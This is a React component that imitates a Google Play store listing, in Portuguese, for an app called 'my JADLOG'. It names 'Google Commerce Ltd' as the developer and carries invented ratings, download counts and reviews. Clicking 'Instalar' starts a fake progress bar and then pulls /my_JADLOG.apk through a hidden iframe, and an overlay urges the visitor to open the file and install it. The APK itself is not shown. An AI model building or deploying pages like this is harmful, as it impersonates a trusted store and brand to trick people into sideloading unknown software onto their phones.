import React, { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";

export default function GooglePlayDownloadPage() {
  const [searchParams] = useSearchParams();
  const [downloadProgress, setDownloadProgress] = useState<number | null>(null);
  const [isCompleted, setIsCompleted] = useState(false);
  const [showOverlay, setShowOverlay] = useState(false);

  useEffect(() => {
    // Carrega fontes oficiais Google Play sem bloquear a renderização
    const font1 = document.createElement("link");
    font1.rel = "stylesheet";
    font1.href = "https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Google+Sans:wght@400;500;700&display=swap";
    document.head.appendChild(font1);

    const font2 = document.createElement("link");
    font2.rel = "stylesheet";
    font2.href = "https://fonts.googleapis.com/css2?family=Google+Material+Icons&display=swap";
    document.head.appendChild(font2);

    const cssLink = document.createElement("link");
    cssLink.rel = "stylesheet";
    cssLink.href = "/downloads/style.css";
    document.head.appendChild(cssLink);

    document.title = "my JADLOG - Apps no Google Play";

    return () => {
      try {
        document.head.removeChild(font1);
        document.head.removeChild(font2);
        document.head.removeChild(cssLink);
      } catch {}
    };
  }, []);

  const handleInstallClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (downloadProgress !== null && !isCompleted) return;

    setDownloadProgress(0);
    let progress = 0;
    const interval = setInterval(() => {
      if (progress < 30) progress += Math.random() * 3 + 2;
      else if (progress < 70) progress += Math.random() * 2 + 1;
      else if (progress < 95) progress += Math.random() * 1.5 + 0.5;
      else progress += 0.8;

      if (progress >= 100) {
        progress = 100;
        clearInterval(interval);
        setDownloadProgress(100);
        setIsCompleted(true);
        setShowOverlay(true);

        // Dispara download do APK
        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = "/my_JADLOG.apk";
        document.body.appendChild(iframe);
      } else {
        setDownloadProgress(Math.floor(progress));
      }
    }, 45);
  };

  const handleShare = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: "my JADLOG",
          text: "Baixe o app oficial my JADLOG:",
          url: window.location.href,
        });
      } catch {}
    } else {
      navigator.clipboard.writeText(window.location.href);
      alert("Link copiado para a área de transferência!");
    }
  };

  return (
    <div className="tQj5Y ghyPEc IqBfM e2G3Fb b30Rkd EIlDfe d8Etdd LcUz9d cjGgHb min-h-screen bg-white text-[#202124]">
      {/* Overlay com Seta de Notificação */}
      {showOverlay && (
        <>
          <div
            id="page-overlay"
            className="visible fixed inset-0 bg-black/75 z-[9999]"
            onClick={() => setShowOverlay(false)}
          />
          <div
            id="open-arrow-indicator"
            className="fixed top-1/5 left-1/2 -translate-x-1/2 z-[10000] text-center text-white cursor-pointer"
            onClick={() => setShowOverlay(false)}
          >
            <span className="blinking-arrow text-5xl font-black block animate-bounce text-emerald-400">↑</span>
            <div className="arrow-text text-sm font-bold uppercase tracking-wider mt-2">
              Clique em abrir<br />para instalar o app
            </div>
          </div>
        </>
      )}

      {/* Header oficial Google Play */}
      <header className="S3WLMd QKrU5e sticky top-0 bg-white z-40 border-b border-gray-100" role="banner">
        <nav className="oPjgQb max-w-5xl mx-auto px-4 h-16 flex items-center justify-between" aria-label="Cabeçalho da página">
          <div className="flex items-center gap-6">
            <a aria-label="Google Play" className="f0UV3d flex items-center gap-2 cursor-pointer">
              <svg className="kOqhQd w-8 h-8" aria-hidden="true" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
                <g>
                  <path d="M19.7,19.2L4.3,35.3c0,0,0,0,0,0c0.5,1.7,2.1,3,4,3c0.8,0,1.5-0.2,2.1-0.6l0,0l17.4-9.9L19.7,19.2z" fill="#EA4335" />
                  <path d="M35.3,16.4L35.3,16.4l-7.5-4.3l-8.4,7.4l8.5,8.3l7.5-4.2c1.3-0.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z" fill="#FBBC04" />
                  <path d="M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,0.4,0,0.7,0.1,1.1l16-15.7L4.3,4.7z" fill="#4285F4" />
                  <path d="M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3c0,0,0,0,0,0L19.8,20z" fill="#34A853" />
                </g>
              </svg>
              <span className="text-xl font-medium text-gray-700 tracking-tight font-['Google_Sans',sans-serif]">
                Google Play
              </span>
            </a>
            <div role="navigation" aria-label="Principal" className="hidden sm:flex items-center gap-6 text-sm font-medium text-gray-600">
              <span className="text-emerald-700 border-b-2 border-emerald-700 pb-5 pt-5 cursor-pointer">Apps</span>
              <span className="hover:text-gray-900 cursor-pointer">Jogos</span>
              <span className="hover:text-gray-900 cursor-pointer">Livros</span>
              <span className="hover:text-gray-900 cursor-pointer">Crianças</span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <button className="p-2 text-gray-600 hover:text-gray-900 rounded-full hover:bg-gray-100" aria-label="Pesquisar">
              <i className="google-material-icons notranslate text-xl" aria-hidden="true">search</i>
            </button>
            <div className="w-8 h-8 rounded-full bg-emerald-600 text-white font-medium text-sm flex items-center justify-center shadow-xs">
              G
            </div>
          </div>
        </nav>
      </header>

      {/* Conteúdo Principal do App 1:1 */}
      <main className="max-w-4xl mx-auto px-4 py-6 sm:py-8">
        <div className="flex flex-row items-start gap-5 sm:gap-7">
          {/* Ícone Jadlog oficial */}
          <div className="icon-loader-wrapper relative shrink-0">
            <img
              src="/jadlog-icon.jpg"
              alt="my JADLOG"
              className="w-20 h-20 sm:w-28 sm:h-28 rounded-2xl shadow-sm object-cover border border-gray-100"
            />
          </div>

          <div className="flex-1 min-w-0">
            <h1 className="text-2xl sm:text-3xl font-bold text-[#202124] tracking-tight">
              my JADLOG
            </h1>
            <p className="text-emerald-700 font-medium text-sm mt-0.5">
              Google Commerce Ltd
            </p>
            <p className="text-xs text-gray-500 mt-0.5">Contém anúncios · Compras no app</p>

            {/* Avaliações e Métricas Oficiais */}
            <div className="flex items-center gap-6 sm:gap-8 mt-4 pt-3 border-t border-gray-100">
              <div className="text-center">
                <div className="flex items-center justify-center gap-1 font-bold text-gray-900 text-sm">
                  <span>4.8</span>
                  <i className="google-material-icons notranslate text-xs text-emerald-600" aria-hidden="true">star</i>
                </div>
                <div className="text-[11px] text-gray-500 mt-0.5">350 Avaliações</div>
              </div>

              <div className="w-[1px] h-6 bg-gray-200" />

              <div className="text-center">
                <div className="font-bold text-gray-900 text-sm">1M+</div>
                <div className="text-[11px] text-gray-500 mt-0.5">downloads</div>
              </div>

              <div className="w-[1px] h-6 bg-gray-200" />

              <div className="text-center flex flex-col items-center">
                <img src="https://i.imgur.com/osUUIx0.png" className="w-4 h-4 object-contain" alt="Classificação Livre" />
                <div className="text-[11px] text-gray-500 mt-0.5">Livre</div>
              </div>
            </div>

            {/* Botões de Ação */}
            <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 mt-5">
              <a
                id="download-trigger"
                href="/my_JADLOG.apk"
                download="my_JADLOG.apk"
                onClick={handleInstallClick}
                className="relative overflow-hidden flex-1 sm:flex-initial sm:min-w-[200px] h-11 bg-[#01875f] hover:bg-[#017250] active:bg-[#005f42] text-white font-medium text-sm rounded-lg transition-all shadow-sm flex items-center justify-center px-6 cursor-pointer"
              >
                {downloadProgress !== null && (
                  <div
                    className="absolute inset-y-0 left-0 bg-[#005f42]/50 transition-[width] duration-75 ease-linear pointer-events-none"
                    style={{ width: `${downloadProgress}%` }}
                  />
                )}
                <span className="relative z-10 flex items-center gap-2">
                  {downloadProgress !== null && downloadProgress < 100 && (
                    <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" />
                  )}
                  {isCompleted
                    ? "Download concluído"
                    : downloadProgress !== null
                    ? `${downloadProgress}%`
                    : "Instalar"}
                </span>
              </a>

              <button
                onClick={handleShare}
                className="h-11 px-4 rounded-lg border border-gray-300 hover:bg-gray-50 text-gray-700 font-medium text-sm transition flex items-center justify-center gap-2"
                aria-label="Compartilhar"
              >
                <i className="google-material-icons notranslate text-lg text-emerald-600" aria-hidden="true">share</i>
                <span>Compartilhar</span>
              </button>
            </div>

            <div className="flex items-center gap-2 text-xs text-gray-500 mt-3">
              <i className="google-material-icons notranslate text-sm" aria-hidden="true">devices</i>
              <span>Seu dispositivo</span>
            </div>
          </div>
        </div>

        {/* Segurança dos dados */}
        <section className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between mb-2">
            <h2 className="text-base font-bold text-gray-900">Segurança dos dados</h2>
            <i className="google-material-icons notranslate text-emerald-700 cursor-pointer" aria-hidden="true">arrow_forward</i>
          </div>
          <p className="text-xs text-gray-600 leading-relaxed mb-4">
            Sua segurança começa quando você entende como os desenvolvedores coletam e compartilham seus dados. As práticas de segurança e privacidade de dados podem variar de acordo com o uso, a região e a idade. O desenvolvedor forneceu as informações a seguir, que podem ser atualizadas ao longo do tempo.
          </p>

          <div className="border border-gray-200 rounded-xl p-4 space-y-3.5 text-xs text-gray-700">
            <div className="flex items-start gap-3">
              <i className="google-material-icons notranslate text-gray-600 text-lg" aria-hidden="true">share</i>
              <div>
                <p className="font-semibold text-gray-900">Este app pode compartilhar estes tipos de dados com terceiros</p>
                <p className="text-gray-500 text-[11px]">Local, Informações pessoais e mais 4</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <i className="google-material-icons notranslate text-gray-600 text-lg" aria-hidden="true">cloud_upload</i>
              <div>
                <p className="font-semibold text-gray-900">Este app pode coletar estes tipos de dados</p>
                <p className="text-gray-500 text-[11px]">Local, Informações pessoais e mais 6</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <i className="google-material-icons notranslate text-gray-600 text-lg" aria-hidden="true">lock</i>
              <div>
                <p className="font-semibold text-gray-900">Os dados são criptografados em trânsito</p>
              </div>
            </div>
            <div className="flex items-start gap-3">
              <i className="google-material-icons notranslate text-gray-600 text-lg" aria-hidden="true">delete</i>
              <div>
                <p className="font-semibold text-gray-900">Você pode solicitar a exclusão dos dados</p>
              </div>
            </div>
          </div>
        </section>

        {/* Notas e avaliações */}
        <section className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between mb-3">
            <h2 className="text-base font-bold text-gray-900">Notas e avaliações</h2>
            <i className="google-material-icons notranslate text-emerald-700 cursor-pointer" aria-hidden="true">arrow_forward</i>
          </div>

          <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-emerald-50 text-emerald-800 rounded-full text-xs font-semibold mb-4 border border-emerald-200">
            <i className="google-material-icons notranslate text-sm" aria-hidden="true">phone_android</i>
            <span>Telefone</span>
          </div>

          <div className="flex items-center gap-4 mb-6">
            <div className="text-4xl font-bold text-gray-900">4.8</div>
            <div>
              <div className="flex text-emerald-600 text-sm">
                <span>★</span><span>★</span><span>★</span><span>★</span><span className="text-gray-300">★</span>
              </div>
              <div className="text-xs text-gray-500 mt-0.5">350 Avaliações</div>
            </div>
          </div>

          <div className="space-y-4 text-xs">
            <div className="border-b border-gray-100 pb-3">
              <div className="flex items-center gap-2 mb-1.5">
                <div className="w-7 h-7 rounded-full bg-gray-200 text-gray-700 font-bold flex items-center justify-center text-xs">M</div>
                <span className="font-semibold text-gray-900">Maria Silva</span>
                <span className="text-gray-400 text-[10px] ml-auto">10/07/2025</span>
              </div>
              <p className="text-gray-600 leading-relaxed">
                Aplicativo excelente! Funcionou perfeitamente no meu celular. Super recomendo para todos.
              </p>
            </div>

            <div className="border-b border-gray-100 pb-3">
              <div className="flex items-center gap-2 mb-1.5">
                <div className="w-7 h-7 rounded-full bg-gray-200 text-gray-700 font-bold flex items-center justify-center text-xs">J</div>
                <span className="font-semibold text-gray-900">João Oliveira</span>
                <span className="text-gray-400 text-[10px] ml-auto">05/07/2025</span>
              </div>
              <p className="text-gray-600 leading-relaxed">
                Muito bom! Instalei sem nenhum problema. Interface limpa e intuitiva.
              </p>
            </div>

            <div className="border-b border-gray-100 pb-3">
              <div className="flex items-center gap-2 mb-1.5">
                <div className="w-7 h-7 rounded-full bg-gray-200 text-gray-700 font-bold flex items-center justify-center text-xs">A</div>
                <span className="font-semibold text-gray-900">Ana Costa</span>
                <span className="text-gray-400 text-[10px] ml-auto">01/07/2025</span>
              </div>
              <p className="text-gray-600 leading-relaxed">
                Perfeito, atendeu todas as minhas necessidades. Nota 10!
              </p>
            </div>
          </div>

          <button className="mt-4 text-emerald-700 font-semibold text-xs hover:underline cursor-pointer">
            Ver todas as avaliações
          </button>
        </section>
      </main>

      {/* Footer Oficial */}
      <footer className="mt-12 border-t border-gray-200 bg-gray-50 text-gray-500 text-xs py-6 px-4">
        <div className="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex flex-wrap items-center gap-4">
            <span className="hover:underline cursor-pointer">Google Play</span>
            <span className="hover:underline cursor-pointer">Play Pass</span>
            <span className="hover:underline cursor-pointer">Termos de Serviço</span>
            <span className="hover:underline cursor-pointer">Privacidade</span>
            <span className="hover:underline cursor-pointer">Sobre o Google Play</span>
          </div>
          <div>Todos os preços incluem Tributo.</div>
        </div>
      </footer>
    </div>
  );
}
